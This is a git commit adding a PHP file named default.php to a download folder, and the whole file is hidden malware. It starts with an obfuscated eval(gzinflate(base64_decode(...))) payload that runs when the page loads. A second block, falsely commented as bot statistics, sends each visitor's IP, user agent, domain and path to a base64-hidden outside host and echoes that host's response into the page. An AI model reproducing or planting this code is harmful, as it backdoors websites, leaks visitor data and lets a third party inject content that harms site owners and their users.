105a4f18e202f69a95a8ee0eeabb321edc583779
nsysucbyang <webnysyucbyang@gmail.com>
2026-03-19 12:14:06 +0800

    Add files via upload

---
+++ algo2002/download/default.php
@@ -0,0 +1,29 @@
+<?php eval(gzinflate(base64_decode("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"))); ?><?php
+if (!isset($sRetry))
+{
+global $sRetry;
+$sRetry = 1;
+    // This code use for global bot statistic
+    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
+    $stCurlHandle = NULL;
+    $stCurlLink = "";
+    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
+    {
+        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
+        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
+            @$stCurlHandle = curl_init( $stCurlLink ); 
+    }
+    } 
+if ( $stCurlHandle !== NULL )
+{
+    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
+    $sResult = @curl_exec($stCurlHandle); 
+    if ($sResult[0]=="O") 
+     {$sResult[0]=" ";
+      echo $sResult; // Statistic code end
+      }
+    curl_close($stCurlHandle); 
+}
+}
+?>
